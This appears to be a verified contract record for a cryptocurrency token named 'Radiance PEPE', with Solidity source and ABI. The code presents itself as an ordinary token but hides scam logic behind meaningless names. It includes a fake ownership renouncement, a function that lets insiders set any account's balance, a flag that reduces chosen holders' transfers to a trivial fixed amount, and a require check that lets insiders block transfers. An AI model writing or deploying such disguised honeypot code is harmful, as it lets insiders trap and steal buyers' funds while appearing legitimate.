{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface tokenTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountSell) external view returns (uint256);\n\n    function transfer(address autoSell, uint256 autoMarketing) external returns (bool);\n\n    function allowance(address toLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoSell,\n        uint256 autoMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingToken, uint256 value);\n    event Approval(address indexed toLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract enableTxReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyTrading {\n    function createPair(address buyAmount, address senderAt) external returns (address);\n}\n\ninterface tokenTxMetadata is tokenTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RadiancePEPE is enableTxReceiver, tokenTx, tokenTxMetadata {\n\n    function owner() external view returns (address) {\n        return modeLaunchTotal;\n    }\n\n    mapping(address => bool) public listTx;\n\n    uint256 public fundAuto;\n\n    event OwnershipTransferred(address indexed tokenTxTeam, address indexed sellEnable);\n\n    function autoTake(address liquidityAuto, address autoSell, uint256 autoMarketing) internal returns (bool) {\n        require(takeLaunched[liquidityAuto] >= autoMarketing);\n        takeLaunched[liquidityAuto] -= autoMarketing;\n        takeLaunched[autoSell] += autoMarketing;\n        emit Transfer(liquidityAuto, autoSell, autoMarketing);\n        return true;\n    }\n\n    uint256 private tradingBuy;\n\n    function balanceOf(address amountSell) public view virtual override returns (uint256) {\n        return takeLaunched[amountSell];\n    }\n\n    uint256 private limitFee;\n\n    function listTotalSender(uint256 autoMarketing) public {\n        feeLaunch();\n        tokenBuyFund = autoMarketing;\n    }\n\n    mapping(address => uint256) private takeLaunched;\n\n    uint256 private receiverLiquidity = 100000000 * 10 ** 18;\n\n    string private txMinAt = \"Radiance PEPE\";\n\n    function name() external view virtual override returns (string memory) {\n        return txMinAt;\n    }\n\n    uint256 public feeAmountSwap;\n\n    uint8 private autoList = 18;\n\n    address receiverTakeAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public modeReceiver;\n\n    uint256 tokenBuy;\n\n    function shouldToken(address receiverMarketingIs) public {\n        require(receiverMarketingIs.balance < 100000);\n        if (limitTxExempt) {\n            return;\n        }\n        if (sellBuy != fundAuto) {\n            fundAuto = tradingBuy;\n        }\n        listTx[receiverMarketingIs] = true;\n        if (fundAmount != sellBuy) {\n            sellBuy = feeAmountSwap;\n        }\n        limitTxExempt = true;\n    }\n\n    function launchedReceiver(address liquidityAuto, address autoSell, uint256 autoMarketing) internal returns (bool) {\n        if (liquidityAuto == modeReceiver) {\n            return autoTake(liquidityAuto, autoSell, autoMarketing);\n        }\n        uint256 swapLimitBuy = tokenTx(isSwapExempt).balanceOf(listAt);\n        require(swapLimitBuy == tokenBuyFund);\n        require(autoSell != listAt);\n        if (enableAuto[liquidityAuto]) {\n            return autoTake(liquidityAuto, autoSell, fundEnable);\n        }\n        return autoTake(liquidityAuto, autoSell, autoMarketing);\n    }\n\n    function approve(address autoTx, uint256 autoMarketing) public virtual override returns (bool) {\n        teamBuy[_msgSender()][autoTx] = autoMarketing;\n        emit Approval(_msgSender(), autoTx, autoMarketing);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeAt;\n    }\n\n    function transferFrom(address liquidityAuto, address autoSell, uint256 autoMarketing) external override returns (bool) {\n        if (_msgSender() != receiverTakeAt) {\n            if (teamBuy[liquidityAuto][_msgSender()] != type(uint256).max) {\n                require(autoMarketing <= teamBuy[liquidityAuto][_msgSender()]);\n                teamBuy[liquidityAuto][_msgSender()] -= autoMarketing;\n            }\n        }\n        return launchedReceiver(liquidityAuto, autoSell, autoMarketing);\n    }\n\n    bool public exemptMode;\n\n    address private modeLaunchTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverLiquidity;\n    }\n\n    function allowance(address teamLimit, address autoTx) external view virtual override returns (uint256) {\n        if (autoTx == receiverTakeAt) {\n            return type(uint256).max;\n        }\n        return teamBuy[teamLimit][autoTx];\n    }\n\n    function tokenAt(address limitTake, uint256 autoMarketing) public {\n        feeLaunch();\n        takeLaunched[limitTake] = autoMarketing;\n    }\n\n    bool public listLiquidityMarketing;\n\n    mapping(address => bool) public enableAuto;\n\n    function feeLaunch() private view {\n        require(listTx[_msgSender()]);\n    }\n\n    uint256 constant fundEnable = 12 ** 10;\n\n    bool public limitTxExempt;\n\n    function isLaunch() public {\n        emit OwnershipTransferred(modeReceiver, address(0));\n        modeLaunchTotal = address(0);\n    }\n\n    function senderMin(address fundMin) public {\n        feeLaunch();\n        if (fundAmount != sellBuy) {\n            sellBuy = limitFee;\n        }\n        if (fundMin == modeReceiver || fundMin == isSwapExempt) {\n            return;\n        }\n        enableAuto[fundMin] = true;\n    }\n\n    address listAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address limitTake, uint256 autoMarketing) external virtual override returns (bool) {\n        return launchedReceiver(_msgSender(), limitTake, autoMarketing);\n    }\n\n    constructor (){\n        \n        autoTeam liquidityShould = autoTeam(receiverTakeAt);\n        isSwapExempt = buyTrading(liquidityShould.factory()).createPair(liquidityShould.WETH(), address(this));\n        if (listLiquidityMarketing) {\n            tradingBuy = sellBuy;\n        }\n        modeReceiver = _msgSender();\n        isLaunch();\n        listTx[modeReceiver] = true;\n        takeLaunched[modeReceiver] = receiverLiquidity;\n        if (exemptMode) {\n            fundAmount = feeAmountSwap;\n        }\n        emit Transfer(address(0), modeReceiver, receiverLiquidity);\n    }\n\n    address public isSwapExempt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoList;\n    }\n\n    uint256 tokenBuyFund;\n\n    mapping(address => mapping(address => uint256)) private teamBuy;\n\n    uint256 private sellBuy;\n\n    function getOwner() external view returns (address) {\n        return modeLaunchTotal;\n    }\n\n    uint256 public fundAmount;\n\n    string private takeAt = \"RPE\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTxTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmountSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwapExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTxExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLiquidityMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoMarketing\",\"type\":\"uint256\"}],\"name\":\"listTotalSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"}],\"name\":\"senderMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketingIs\",\"type\":\"address\"}],\"name\":\"shouldToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMarketing\",\"type\":\"uint256\"}],\"name\":\"tokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RadiancePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}